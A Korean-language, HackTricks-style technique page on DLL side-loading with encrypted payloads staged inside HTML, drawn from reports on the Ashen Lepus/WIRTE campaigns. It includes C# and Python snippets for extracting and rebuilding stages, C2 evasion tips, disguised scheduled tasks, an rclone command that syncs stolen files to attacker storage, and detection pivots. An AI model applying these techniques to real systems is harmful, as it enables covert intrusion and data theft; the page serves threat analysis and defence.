# HTML-Embedded Payload Staging을 활용한 Advanced DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft 개요

Ashen Lepus(WIRTE라고도 함)는 DLL sideloading, staged HTML payloads, modular .NET backdoors를 연결하는 반복 가능한 패턴을 weaponize하여 중동 외교 네트워크 내부에 persist했습니다. 이 기법은 다음에 의존하므로 어떤 operator든 재사용할 수 있습니다.<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: 무해한 PDF가 대상에게 file-sharing site에서 RAR archive를 가져오도록 안내합니다. archive에는 실제 문서 viewer처럼 보이는 EXE, 신뢰할 수 있는 library의 이름을 딴 malicious DLL(예: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), 그리고 decoy `Document.pdf`가 포함됩니다.
- **DLL search order abuse**: 피해자가 EXE를 double-click하면 Windows는 current directory에서 DLL import를 resolve하고, malicious loader(AshenLoader)는 신뢰할 수 있는 process 내부에서 실행되는 동시에 decoy PDF를 열어 의심을 피합니다.
- **Living-off-the-land staging**: 이후의 모든 stage(AshenStager → AshenOrchestrator → modules)는 필요할 때까지 disk에 저장되지 않으며, 겉보기에는 무해한 HTML responses 내부에 숨겨진 encrypted blobs로 전달됩니다.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE가 AshenLoader를 side-load하면, AshenLoader는 host recon을 수행하고 AES-CTR로 이를 encrypt한 뒤 `token=`, `id=`, `q=`, `auth=`와 같이 순환하는 parameters에 담아 API처럼 보이는 paths(예: `/api/v2/account`)로 POST합니다.<sup>[[1]](#references)</sup>
2. **HTML extraction**: C2는 client IP가 target region으로 geolocate되고 `User-Agent`가 implant와 일치할 때만 다음 stage를 노출하여 sandbox를 방해합니다. 검사가 통과되면 HTTP body에는 Base64/AES-CTR encrypted AshenStager payload가 포함된 `<headerp>...</headerp>` blob이 들어 있습니다.
3. **Second sideload**: AshenStager는 `wtsapi32.dll`을 import하는 또 다른 legitimate binary와 함께 배포됩니다. binary에 inject된 malicious copy는 추가 HTML을 가져오며, 이번에는 `<article>...</article>`을 추출하여 AshenOrchestrator를 복구합니다.
4. **AshenOrchestrator**: Base64 JSON config를 decode하는 modular .NET controller입니다. config의 `tg` 및 `au` fields를 concatenate/hash한 값이 AES key가 되며, 이 key로 `xrk`를 decrypt합니다. 그 결과로 생성된 bytes는 이후 fetch되는 모든 module blobs의 XOR key로 사용됩니다.
5. **Module delivery**: 각 module은 HTML comments를 통해 parser를 임의의 tag로 redirect하도록 지정되며, `<headerp>` 또는 `<article>`만 확인하는 static rules를 우회합니다. modules에는 persistence(`PR*`), uninstallers(`UN*`), reconnaissance(`SN`), screen capture(`SCT`), file exploration(`FE`)이 포함됩니다.

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
방어자가 특정 element를 차단하거나 제거하더라도, operator는 HTML comment에 제시된 tag만 변경하면 delivery를 재개할 수 있습니다.<sup>[[1]](#references)</sup>

### 빠른 Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

최근 HTML smuggling 연구(Talos)는 HTML 첨부 파일의 `<script>` 블록 내부에 Base64 문자열로 숨긴 payload를 런타임에 JavaScript로 디코딩하는 방식을 강조합니다.<sup>[[2]](#references)</sup> 동일한 기법을 C2 응답에도 재사용할 수 있습니다. 즉, script tag(또는 다른 DOM element) 내부에 암호화된 blob을 stage하고 AES/XOR를 적용하기 전에 메모리에서 디코딩하면 페이지가 일반적인 HTML처럼 보이게 만들 수 있습니다. Talos는 script tag 내부에서 identifier renaming과 Base64/Caesar/AES를 함께 사용하는 layered obfuscation도 보여 주며, 이는 HTML-staged C2 blob에 그대로 적용할 수 있습니다.<sup>[[2]](#references)</sup> 이후 Talos가 작성한 **hidden text salting** 관련 글도 여기에서 유용합니다. 관련 없는 HTML 주석이나 whitespace를 삽입해 Base64를 분할하면 단순한 regex extractor를 무력화하면서도 브라우저 측 reconstruction은 간단하게 유지할 수 있습니다.<sup>[[7]](#references)</sup>

## Recent Variant Notes (2024-2025)

- Check Point는 2024년에 archive-based sideloading을 여전히 기반으로 사용하면서 `propsys.dll` (stagerx64)을 first stage로 사용한 WIRTE campaign을 관찰했습니다. 이 stager는 Base64 + XOR (key `53`)를 사용해 다음 payload를 디코딩하고, hardcoded `User-Agent`가 포함된 HTTP request를 전송하며, HTML tag 사이에 삽입된 encrypted blob을 추출합니다. 한 branch에서는 `RtlIpv4StringToAddressA`로 디코딩한 embedded IP string의 긴 목록에서 stage를 재구성한 다음 이를 payload bytes로 concatenate했습니다.<sup>[[3]](#references)</sup>
- OWN-CERT는 side-loaded `wtsapi32.dll` dropper가 Base64 + TEA로 string을 보호하고 DLL name 자체를 decryption key로 사용한 이전 WIRTE tooling을 문서화했습니다. 이후 C2로 전송하기 전에 host identification data를 XOR/Base64로 obfuscate했습니다.<sup>[[4]](#references)</sup>

## Reconstructing IP-Encoded Stages

WIRTE의 2024년 `propsys.dll` branch는 다음 PE가 하나의 contiguous HTML blob으로 존재할 필요가 없다는 점을 보여 줍니다. Loader는 stage bytes를 dotted-quad string으로 저장한 후 `RtlIpv4StringToAddressA`를 사용해 재구성할 수 있으며, 이는 Hive의 **IPfuscation** tradecraft와 밀접하게 관련된 pattern입니다.<sup>[[3]](#references)[[5]](#references)</sup> Operationally, 이는 actor가 HTML page에 명백한 Base64 payload 대신 무해한 IOC나 config data처럼 보이는 내용을 포함하려 할 때 유용합니다.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
복구된 바이트가 `MZ`로 시작한다면 다음 PE를 직접 재구성했을 가능성이 높습니다. 그렇지 않다면 앞에 XOR/Base64 레이어가 있는지 또는 주소 사이에 작은 delimiter 청크가 있는지 확인하세요.

## 교체 가능한 DLL 이름 및 Host Rotation

이 패턴의 강력한 특징은 **sideload pair만 변경하고 HTML/AES/XOR staging backend는 그대로 유지할 수 있다는 점**입니다. WIRTE는 캠페인 전반에서 `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, `propsys.dll`을 교체하며 사용했으며, 이는 다음과 같은 이유로 유용합니다.<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll`과 `wtsapi32.dll`은 방어자가 `%System32%` / `%SysWOW64%`에 존재할 것으로 예상하는 평범한 Windows DLL 이름입니다.
- **HijackLibs**와 같은 공개 catalog는 복사된 애플리케이션 디렉터리에서 해당 DLL 이름을 로드할 여러 바이너리를 이미 매핑하고 있으므로, operator는 stager를 다시 설계하지 않고도 replacement host를 확보할 수 있습니다.
- Host별로 export surface만 조정하면 됩니다. HTML parser, AES/XOR routines 및 module loader는 일반적으로 forwarding proxy DLL에 수정 없이 이식할 수 있습니다.

Offensive lab 작업에서는 문제를 **(1) 선택한 DLL 이름을 로컬에서 resolve하는 안정적인 signed host 찾기**와 **(2) 해당 DLL 뒤에서 동일한 staged-HTML loader logic 재사용하기**로 분리할 수 있습니다.

## Crypto 및 C2 Hardening

- **어디서나 AES-CTR 사용**: 현재 loader는 256-bit key와 nonce(예: `{9a 20 51 98 ...}`)를 내장하며, 복호화 전후에 `msasn1.dll`과 같은 문자열을 사용하는 XOR layer를 추가할 수도 있습니다.<sup>[[1]](#references)</sup>
- **Key material 변형**: 이전 loader는 Base64 + TEA를 사용해 embedded string을 보호했으며, decryption key는 malicious DLL 이름(예: `wtsapi32.dll`)에서 파생되었습니다.<sup>[[4]](#references)</sup>
- **Infrastructure 분리 + subdomain camouflage**: staging server는 tool별로 분리되고 서로 다른 ASN에 호스팅되며, 때로는 합법적으로 보이는 subdomain 앞에 배치되므로 하나의 stage가 노출되어도 나머지까지 드러나지 않습니다.
- **Recon smuggling**: 이제 수집 데이터에는 고가치 애플리케이션을 찾기 위한 Program Files 목록이 포함되며, host 외부로 전송되기 전에 항상 암호화됩니다.
- **URI churn**: query parameter와 REST path는 캠페인마다 변경됩니다(`/api/v1/account?token=` → `/api/v2/account?auth=`). 따라서 취약한 detection을 무력화할 수 있습니다.
- **User-Agent 고정 + 안전한 redirect**: C2 infrastructure는 정확히 일치하는 UA string에만 응답하며, 그 외에는 정상적인 news/health site로 redirect하여 일반 트래픽에 섞입니다.
- **Gated delivery**: server는 geo-fence되며 real implant에만 응답합니다. 승인되지 않은 client에는 의심스럽지 않은 HTML을 제공합니다.

## Persistence 및 Execution Loop

AshenStager는 Windows maintenance job으로 위장한 scheduled task를 생성하고 `svchost.exe`를 통해 실행합니다. 예시는 다음과 같습니다.<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

이러한 task는 boot 시 또는 일정한 간격으로 sideloading chain을 다시 실행하여, AshenOrchestrator가 disk를 다시 건드리지 않고도 최신 module을 요청할 수 있도록 합니다.

## Exfiltration을 위한 정상적인 Sync Client 사용

Operator는 전용 module을 통해 외교 문서를 `C:\Users\Public`(모든 사용자가 읽을 수 있고 의심스럽지 않은 경로)에 staging한 다음, 합법적인 [Rclone](https://rclone.org/) binary를 다운로드하여 해당 디렉터리를 attacker storage와 동기화합니다. Unit42는 이 actor가 exfiltration에 Rclone을 사용하는 것을 관찰한 것이 이번이 처음이라고 설명하며, 이는 정상적인 traffic에 섞이기 위해 합법적인 sync tooling을 악용하는 broader trend와 일치합니다.<sup>[[1]](#references)</sup>

1. **Stage**: 대상 파일을 `C:\Users\Public\{campaign}\`에 복사/수집합니다.
2. **Configure**: attacker가 제어하는 HTTPS endpoint(예: `api.technology-system[.]com`)를 가리키는 Rclone config를 전달합니다.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`를 실행하여 traffic이 일반적인 cloud backup처럼 보이도록 합니다.

Rclone은 합법적인 backup workflow에서 널리 사용되므로, 방어자는 비정상적인 실행(새 binary, 이상한 remote 또는 `C:\Users\Public`의 갑작스러운 sync)에 집중해야 합니다.

## Detection Pivots

- **signed process**가 user-writable path에서 예기치 않게 DLL을 로드하는지 alert를 생성하세요(Procmon filter + `Get-ProcessMitigation -Module`). 특히 DLL 이름이 `netutils`, `srvcli`, `dwampi`, `wtsapi32` 또는 `propsys`와 겹치는 경우를 주의해야 합니다.<sup>[[6]](#references)</sup>
- unusual tag 내부에 삽입된 **대형 Base64 blob** 또는 `<!-- TAG: <xyz> -->` comment로 보호된 의심스러운 HTTPS response를 조사하세요.
- 먼저 HTML을 normalize하세요. Base64 extraction 전에 **comment를 제거하고 whitespace를 축약**해야 합니다. hidden-text-salting 방식의 evasion은 comment boundary를 가로질러 payload를 분할할 수 있기 때문입니다.
- **`<script>` block 내부의 Base64 string**까지 HTML hunting 범위를 확장하세요. 이는 HTML smuggling 방식의 staging으로, AES/XOR processing 전에 JavaScript를 통해 decode됩니다.
- 특히 주변 string이 실제 network target이 아니라 긴 IPv4 목록일 때, **`RtlIpv4StringToAddressA`를 반복 호출한 뒤 buffer를 assembly하는 동작**을 탐지하세요.
- `svchost.exe`를 non-service argument와 함께 실행하거나 dropper directory를 가리키는 **scheduled task**를 탐지하세요.
- 정확히 일치하는 `User-Agent` string에만 payload를 반환하고, 그 외에는 정상적인 news/health domain으로 redirect하는 **C2 redirect**를 추적하세요.
- IT가 관리하는 위치 외부에 나타나는 **Rclone** binary, 새 `rclone.conf` file 또는 `C:\Users\Public`과 같은 staging directory에서 데이터를 가져오는 sync job을 모니터링하세요.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
